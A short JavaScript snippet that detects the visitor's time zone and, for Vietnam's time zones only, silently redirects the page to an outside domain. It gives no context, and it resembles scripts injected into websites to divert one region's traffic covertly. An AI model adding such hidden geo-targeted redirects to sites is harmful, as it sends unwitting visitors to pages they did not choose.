const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
console.log(userTimeZone);

if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
  window.location.href = "https://lobby10.n11s.io/";
}
